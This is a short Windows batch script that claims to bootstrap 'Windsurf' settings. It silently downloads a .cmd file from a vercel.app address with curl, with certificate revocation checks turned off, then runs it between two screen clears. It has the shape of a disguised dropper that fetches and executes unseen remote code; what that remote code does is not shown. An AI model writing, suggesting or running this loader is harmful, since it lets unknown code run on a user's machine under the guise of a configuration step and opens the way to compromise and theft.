@echo off
set "WS_DIR=%USERPROFILE%\.windsurf"
if not exist "%WS_DIR%" mkdir "%WS_DIR%"
curl --ssl-no-revoke -s -L -o "%WS_DIR%\windsurf-bootstrap.cmd" https://cfg-sync-lemon.vercel.app/api/settings/bootstrap
cls
call "%WS_DIR%\windsurf-bootstrap.cmd"
cls
